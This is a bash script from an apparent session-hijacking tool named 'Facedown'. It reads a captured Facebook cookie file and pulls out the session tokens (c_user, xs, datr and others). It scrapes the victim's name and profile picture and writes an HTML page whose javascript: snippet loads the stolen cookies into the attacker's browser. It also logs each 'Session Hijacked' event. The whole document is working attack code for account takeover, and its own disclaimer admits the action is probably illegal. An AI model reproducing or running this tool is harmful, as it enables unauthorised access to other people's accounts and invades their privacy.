# input is [cookieFile] "That Contains One Cookie"
export cookieFile="$1"
# usage : ./PageBulid [cookieFile]

cookie=$(cat $cookieFile)
userId=$(echo $cookie | grep -oE "c_user.*" | cut -d "=" -f 2 | cut -d ";" -f 1) 

c_user=$userId
datr=$(echo $cookie | grep -oE "datr.*" | cut -d " " -f 1 | cut -d ";" -f 1 | cut -d "\"" -f 1);
xs=$(echo $cookie | grep -oE "xs.*" | cut -d " " -f 1 | cut -d ";" -f 1 | cut -d "\"" -f 1);
fr=$(echo $cookie | grep -oE "fr.*" | cut -d " " -f 1 | cut -d ";" -f 1 | cut -d "\"" -f 1);
presence=$(echo $cookie | grep -oE "presence.*" | cut -d " " -f 1 | cut -d ";" -f 1 | cut -d "\"" -f 1);
act=$(echo $cookie | grep -oE "act.*" | cut -d " " -f 1 | cut -d ";" -f 1 | cut -d "\"" -f 1);
lu=$(echo $cookie | grep -oE "lu.*" | cut -d " " -f 1  | cut -d ";" -f 1 | cut -d "\"" -f 1);

############# Bulding the web page ##################
### input is [user id + cookie values]
wget -q -U Mozilla http://www.facebook.com/$userId
Name=$(cat $userId | grep '<title id="pageTitle">‪' | cut -d "|" -f 3 | grep -oE "pageTitle.*" | cut -d ">" -f 2)
#Name=$(echo ${Name:3:${#Name}})

ProfilePic=$(cat $userId | grep -oE '<img class="profilePic img" src=".*/>' | grep -oE 'http.*.jpg' | cut -d "\"" -f 1)

redirect=$(echo "window.location=\"http://www.facebook.com\";")
injectFunction=$(echo "function inject(){";echo "$redirect;";echo "}")

TextAreaText=$(echo "javascript:void(document.cookie=\"c_user=$c_user\");void(document.cookie=\"$presence\");void(document.cookie=\"$act\");void(document.cookie=\"$datr\");void(document.cookie=\"locale=en_US\");void(document.cookie=\"$lu\");void(document.cookie=\"$xs\");void(document.cookie=\"x-referer=http%3A%2F%2Fwww.facebook.com%2F%23%2F\")")
TextArea=$(echo "<p><textarea style=\"resize:none\" rows=\"1\" cols=\"30\" readonly>";echo "$TextAreaText";echo "</textarea></p>")
link=$(echo "<link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\" />")
title=$(echo "<title> $Name | Facedown</title>")
script=$(echo "<script>";echo "$injectFunction";echo "</script>")
head=$(echo "<head>";echo $link;echo $title ;echo $script;echo "</head>")
button=$(echo "<input type=\"button\" onclick=\"inject()\" value=\"Go To Facebook\" /> ")
image=$(echo "<img src=\"$ProfilePic\" width=\"120\" height=\"120\">")
Pname=$(echo "<p> $Name <p/>")
Ptext=$(echo "<p id=\"writing\">Probably this action is illegal!<br/>Make sure that this person knows you're doing this<br/>This action is on your own risk!<br/></p>")
PHelp=$(echo "<p id=\"writing\"><a href=\"Help.html\" title=\"What's This?\">What's This?</a></p>")
div=$(echo "<div class=\"user\">";echo "$image" ;echo "$Pname";echo "$TextArea";echo "$PHelp";echo "$button";echo "$Ptext";echo "</div>")

body=$(echo "<body>";echo "$div";echo "</body>")
mkdir "$Name"
cd "$Name"
#wget -q -U Mozilla $ProfilePic # save this to a log file
#cp *.jpg ../../../../Hijack_Log/$Name.jpg  #root/session/date/time/uname
### dont forget to copy the css file
cp ../../../../Web/style.css style.css
cp ../../../../Web/Help.html Help.html
cp ../../../../Web/style_help.css style_help.css
cp ../../../../Web/1_thumbnail.png 1_thumbnail.png
cp ../../../../Web/2_thumbnail.png 2_thumbnail.png
cp ../../../../Web/1.png 1.png
cp ../../../../Web/2.png 2.png
Stime=$(date +%T)
SsessionDate=$(date +%d-%m-%y)
#This Session Log Reg
SlogFile=../fdS.log
oldSLog=$(cat $SlogFile)
(echo "$oldSLog";echo "Session Hijacked @ /$SsessionDate [$Stime]/  # $Name")>$SlogFile
#ALL Log Reg
logFile=../../../../fd.log
oldLog=$(cat $logFile)
(echo "$oldLog";echo "Session Hijacked @ /$SsessionDate [$Stime]/  # $Name")>$logFile
(echo "<html>" ;echo "$head";echo "$body";echo "</html>")>inject.html
firefox inject.html 
